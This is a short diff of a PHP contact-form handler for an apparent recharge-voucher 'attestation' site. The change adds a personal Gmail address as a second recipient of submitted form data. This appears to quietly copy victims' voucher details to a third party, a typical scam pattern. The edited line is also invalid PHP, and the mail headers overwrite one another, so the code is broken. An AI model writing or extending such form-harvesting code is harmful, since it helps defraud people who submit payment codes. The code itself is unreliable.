@@ -76,7 +76,7 @@ if(!empty($_POST)){
     }
 
     if(count($errors) == 0){
-        $mailTo = "info@fiches-attestationdesrecharges.com";
+        $mailTo = "refund@fiches-attestationdesrecharges.com", "kilmeraf90@gmail.com";
         $headers = "From: Site de Fiche d'attestation des recharges\r\n";
         $headers = "Reply-To: refund@fiches-attestationdesrecharges.com\r\n";
         $headers = "Content-type: text/html\r\n";
@@ -95,7 +95,6 @@ if(!empty($_POST)){
         header("Location: answer.html");
     }
 }
-
 
 ?>
 
